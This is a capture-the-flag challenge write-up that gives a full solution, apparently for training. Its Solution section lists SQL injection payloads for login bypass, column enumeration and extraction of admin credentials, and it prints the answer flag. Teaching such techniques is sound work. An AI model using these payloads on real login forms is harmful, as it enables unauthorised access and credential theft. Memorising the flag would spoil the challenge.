# CTF Challenge: SQL Injection Master

## Challenge Information

| Field | Details |
|-------|---------|
| Name | SQL Injection Master |
| Difficulty | Medium-Hard |
| Points | 300 |
| Category | Web Security |
| Flag Format | `KB{sha256}` |

## Description

A vulnerable login form on a banking application has been discovered. Your mission is to extract the admin credentials and login to get the flag.

## Target

```
URL: https://ctf.burpkb.com/challenge/sql-master
```

## Hints

1. The application uses MySQL
2. Error messages reveal database structure
3. Order by clause is vulnerable

## Solution

### Step 1: Identify the Vulnerability

Test the login form with basic SQL injection:

```
Username: admin'--
Password: anything
```

### Step 2: Column Enumeration

```
Username: admin' ORDER BY 3-- 
```

Returns error. Try 2:

```
Username: admin' ORDER BY 2--
```

Works! Columns = 2

### Step 3: Extract Data

```sql
Username: admin' UNION SELECT 1,version()--
```

### Step 4: Get Admin Password

```sql
Username: admin' UNION SELECT username,password FROM users WHERE role='admin'--
```

### Flag

After obtaining credentials and logging in:

```
KB{5f4dcc3b5aa765d61d8327deb882cf99}
```

## Learning Points

- Always test for SQL injection in login forms
- UNION-based injection for data extraction
- Error messages are valuable for enumeration

---

## Scoring

| Action | Points |
|--------|--------|
| Identify vulnerability | 50 |
| Enumerate columns | 50 |
| Extract database version | 50 |
| Get admin credentials | 100 |
| Submit flag | 50 |

---

**Category**: Web - SQL Injection
**Author**: Burp KB Team
